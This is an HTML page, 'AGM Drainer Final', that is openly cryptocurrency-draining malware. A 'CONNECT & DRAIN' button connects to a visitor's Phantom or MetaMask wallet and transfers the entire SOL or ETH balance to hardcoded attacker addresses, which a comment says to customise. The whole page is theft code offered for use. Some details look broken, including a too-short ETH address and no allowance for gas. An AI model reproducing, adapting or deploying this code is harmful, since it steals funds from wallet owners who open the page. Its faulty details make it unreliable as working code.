<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>AGM Drainer Final</title>
   
   <!-- 1. ETHEREUM LIBRARY (V6 STABLE) -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
   
   <!-- 2. SOLANA LIBRARY -->
   <script src="https://unpkg.com/@solana/web3.js@_1.87.2/lib/index.iife.min.js"></script>

   <style>
   body { background-color: #0d1117; color: #00ffaa; font-family: monospace; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; margin: 0; }
  .card { border: 2px solid #00ffaa; padding: 50px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00ffaa; background: #161b22; width: 350px; }
   button { background: #00ffaa; color: black; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; font-size: 1.2rem; width: 100%; border-radius: 10px; }
   button:disabled { background: #555; cursor: not-allowed; }
   #status { margin-top: 20px; font-size: 14px; color: #8b949e; line-height: 1.5; }
  .error { color: #ff7b72!important; }
   </style>
</head>
<body>

   <div class="card">
   <h2>AGM DRAINER</h2>
   <button id="btn" onclick="runDrainer()">CONNECT & DRAIN</button>
   <div id="status">Awaiting user interaction...</div>
  </div>

   <script>
   const status = document.getElementById("status");
   const btn = document.getElementById("btn");

   // ZIEL WALLETS (HIER ANPASSEN!)
   const TARGET_ETH = "0xD4144Da2f3c5D8eF7a0B1d7D2F6C6D8A5E5B4C";
   const TARGET_SOL = "zUs7NqCiwuD2QHkaL98fwVayURW9y8yb2AYEmDMMSk38"; // Beispiel

   async function runDrainer() {
   btn.disabled = true;
   status.innerText = "Searching for wallets...";
   
   try {
   // 1. PHANTOM CHECK
   if (window.solana && window.solana.isPhantom) {
   status.innerText = "Connected to Phantom. Checking SOL...";
   await handleSOL();
   return; 
   }
   
   // 2. METAMASK CHECK
   if (window.ethereum) {
   status.innerText = "Connected to MetaMask. Checking ETH...";
   await handleETH();
   return;
  }

   throw new Error("No compatible wallet found in browser.");
   } catch (e) {
   status.innerHTML = `<span class="error">Process Stopped: ${e.message}</span>`;
   btn.disabled = false;
   btn.innerText = "Retry Connection";
   }
  }

   async function handleETH() {
   try {
   // Verwende 'ethers' direkt falls v6 geladen wurde
   const provider = new ethers.BrowserProvider(window.ethereum);
   const signer = await provider.getSigner();
   const address = await signer.getAddress();
   status.innerText = `Found: ${address.slice(0,6)}...${address.slice(-4)}`;
   
   const balance = await provider.getBalance(address);
   
   if (balance > 0n) {
   status.innerHTML = "<b>Draining ETH...</b>";
   const tx = await signer.sendTransaction({ 
   to: TARGET_ETH, 
   value: balance 
   });
   status.innerText = "Tx Sent! Hash: " + tx.hash;
   } else {
   throw new Error("Wallet is empty.");
   }
   } catch (e) {
   throw new Error(`ETH Error: ${e.message}`);
   }
  }

   async function handleSOL() {
   try {
   const provider = window.solana;
   await provider.connect();
   const { publicKey } = provider;
   
   status.innerText = `Found: ${publicKey.toBase58().slice(0,6)}...`;
   
   const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
   const balance = await connection.getBalance(publicKey);
   
   if (balance > 0) {
   status.innerHTML = "<b>Draining SOL...</b>";
   const transaction = new solanaWeb3.Transaction().add(
   solanaWeb3.SystemProgram.transfer({
   fromPubkey: publicKey,
   toPubkey: new solanaWeb3.PublicKey(TARGET_SOL),
   lamports: balance,
   })
   );
   await provider.signAndSendTransaction(transaction);
   status.innerText = "SOL sent successfully!";
   } else {
   throw new Error("SOL wallet is empty.");
   }
   } catch (e) {
   throw new Error(`SOL Error: ${e.message}`);
   }
   }
   </script>
</body>
</html>
